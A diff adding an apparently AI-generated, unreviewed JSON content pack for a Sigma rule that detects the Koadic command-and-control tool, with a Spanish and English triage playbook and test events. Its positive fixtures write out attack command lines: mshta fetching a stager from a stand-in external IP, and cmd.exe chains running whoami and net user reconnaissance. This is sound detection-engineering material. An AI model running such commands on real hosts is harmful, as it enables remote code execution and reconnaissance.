@@ -1,0 +1,137 @@
+{
+  "rule": {
+    "id": "5cddf373-ef00-4112-ad72-960ac29bac34",
+    "title": "HackTool - Koadic Execution",
+    "level": "high",
+    "status": "test",
+    "author": "wagga, Jonhnathan Ribeiro, oscd.community",
+    "path": "windows/process_creation/proc_creation_win_hktl_koadic.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_hktl_koadic.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1059.003",
+      "T1059.005",
+      "T1059.007"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se ejecutó cmd.exe con los parámetros /q, /c y chcp en la línea de comandos, un patrón que el stager JScript de Koadic usa para correr comandos en el equipo comprometido. Puede indicar una sesión activa de post-explotación.",
+      "what_it_detects": "Creación de procesos donde Image termina en \\cmd.exe u OriginalFileName es Cmd.Exe, y CommandLine contiene a la vez '/q', '/c' y 'chcp'. Koadic usa esta forma para fijar la página de códigos antes de ejecutar el comando y redirigir la salida a un archivo temporal.",
+      "why_it_matters": "Koadic es un framework de comando y control basado en COM que opera mediante JScript/VBScript (mshta, rundll32, regsvr32, wscript). Esta alerta corresponde a ejecución por intérprete de comandos de Windows (T1059.003), VBScript (T1059.005) y JavaScript (T1059.007), e implica control remoto del host.",
+      "triage_steps": [
+        "Revise el CommandLine completo: identifique el comando después de chcp (por ejemplo whoami, net, reg) y cualquier redirección a archivos en %TEMP%.",
+        "Revise ParentImage y su línea de comandos: mshta.exe, rundll32.exe, regsvr32.exe, wscript.exe o cscript.exe como padre refuerzan la sospecha de Koadic.",
+        "Construya el árbol de procesos del mismo host en +/- 15 minutos: busque otros cmd.exe con el mismo patrón y procesos hijos inesperados.",
+        "Busque conexiones de red del proceso padre hacia IP o dominios externos poco comunes, típicas del canal HTTP de Koadic.",
+        "Verifique el usuario que ejecutó el proceso y si su actividad es habitual; pivote por ese usuario en otros equipos.",
+        "Revise archivos de salida temporales creados en el directorio Temp del usuario y obtenga sus hash.",
+        "Consulte alertas previas del mismo host o usuario: phishing, adjuntos HTA o ejecución de scripts."
+      ],
+      "false_positives": [
+        "Scripts de administración o instaladores que ejecutan cmd /q /c chcp para fijar la página de códigos antes de otros comandos.",
+        "Herramientas de gestión remota (RMM) o de compilación que lanzan cmd.exe en modo silencioso con chcp."
+      ],
+      "response_steps": [
+        "Confirme la actividad maliciosa validando el proceso padre, los comandos ejecutados y las conexiones de red asociadas.",
+        "Si se confirma, aísle el endpoint de la red y bloquee los dominios o IP de C2 identificados.",
+        "Finalice los procesos implicados y elimine mecanismos de persistencia y archivos del stager tras preservar evidencia.",
+        "Restablezca las credenciales del usuario afectado y revise movimiento lateral desde el host.",
+        "Restaure el equipo desde una imagen confiable si hay dudas sobre la integridad y monitoree recurrencias."
+      ],
+      "severity_rationale": "Nivel alto porque la combinación /q, /c y chcp es característica de Koadic y rara en uso legítimo, e indica ejecución remota de comandos."
+    },
+    "en": {
+      "summary": "cmd.exe ran with /q, /c and chcp on its command line, a pattern the Koadic JScript stager uses to run commands on a compromised host. This may indicate an active post-exploitation session.",
+      "what_it_detects": "Process creation where Image ends with \\cmd.exe or OriginalFileName is Cmd.Exe, and CommandLine contains all of '/q', '/c' and 'chcp'. Koadic uses this form to set the code page before running a command and redirecting output to a temp file.",
+      "why_it_matters": "Koadic is a COM-based command-and-control framework operating through JScript/VBScript (mshta, rundll32, regsvr32, wscript). This maps to Windows command shell (T1059.003), VBScript (T1059.005) and JavaScript (T1059.007) execution and implies remote control of the host.",
+      "triage_steps": [
+        "Read the full CommandLine: identify the command after chcp (e.g. whoami, net, reg) and any output redirection to files in %TEMP%.",
+        "Check ParentImage and its command line: mshta.exe, rundll32.exe, regsvr32.exe, wscript.exe or cscript.exe as parent strengthens the Koadic hypothesis.",
+        "Build the process tree on the same host within +/- 15 minutes: look for more cmd.exe with this pattern and unexpected children.",
+        "Look for network connections from the parent process to uncommon external IPs or domains, typical of Koadic's HTTP channel.",
+        "Verify the user who ran the process and whether this is normal for them; pivot on that user across other hosts.",
+        "Inspect temporary output files in the user's Temp directory and collect their hashes.",
+        "Review earlier alerts for the same host or user: phishing, HTA attachments or script execution."
+      ],
+      "false_positives": [
+        "Admin scripts or installers running cmd /q /c chcp to set the code page before other commands.",
+        "Remote management (RMM) or build tools launching cmd.exe quietly with chcp."
+      ],
+      "response_steps": [
+        "Confirm malicious activity by validating the parent process, executed commands and related network connections.",
+        "If confirmed, isolate the endpoint and block identified C2 domains or IPs.",
+        "Kill involved processes and remove persistence and stager files after preserving evidence.",
+        "Reset the affected user's credentials and check for lateral movement from the host.",
+        "Reimage from a trusted baseline if integrity is in doubt and monitor for recurrence."
+      ],
+      "severity_rationale": "High because the /q, /c and chcp combination is characteristic of Koadic, uncommon in legitimate use, and indicates remote command execution."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "Koadic stager spawned by mshta runs whoami via cmd.exe /q /c chcp with output redirected to Temp",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\cmd.exe",
+          "OriginalFileName": "Cmd.Exe",
+          "CommandLine": "\"C:\\Windows\\System32\\cmd.exe\" /q /c chcp 437 & whoami /all 1> C:\\Users\\jperez\\AppData\\Local\\Temp\\f3a9c1d2.txt 2>&1",
+          "ParentImage": "C:\\Windows\\System32\\mshta.exe",
+          "ParentCommandLine": "mshta.exe http://203.0.113.45:9999/Xk2pa",
+          "IntegrityLevel": "Medium"
+        }
+      },
+      {
+        "description": "Renamed cmd binary identified by OriginalFileName running net user through the Koadic pattern",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0207.andes.example.com",
+          "User": "ANDES\\mrodriguez",
+          "Image": "C:\\Users\\mrodriguez\\AppData\\Local\\Temp\\svc.exe",
+          "OriginalFileName": "Cmd.Exe",
+          "CommandLine": "svc.exe /q /c chcp 437 & net user 1> C:\\Users\\mrodriguez\\AppData\\Local\\Temp\\b71e.txt 2>&1",
+          "ParentImage": "C:\\Windows\\System32\\rundll32.exe",
+          "IntegrityLevel": "Medium"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Build script sets UTF-8 code page with cmd /c chcp but without the /q switch",
+        "event": {
+          "EventID": 1,
+          "Computer": "BUILD-03.andes.example.com",
+          "User": "ANDES\\svc_build",
+          "Image": "C:\\Windows\\System32\\cmd.exe",
+          "OriginalFileName": "Cmd.Exe",
+          "CommandLine": "cmd.exe /c chcp 65001 > nul & python build.py",
+          "ParentImage": "C:\\Program Files\\Jenkins\\jenkins.exe",
+          "IntegrityLevel": "High"
+        }
+      },
+      {
+        "description": "PowerShell runs chcp with /q and /c-like arguments, but the image is not cmd.exe",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "OriginalFileName": "PowerShell.EXE",
+          "CommandLine": "powershell.exe -NoProfile -Command \"chcp 65001; robocopy C:\\data D:\\backup /q /c\"",
+          "ParentImage": "C:\\Windows\\explorer.exe",
+          "IntegrityLevel": "Medium"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
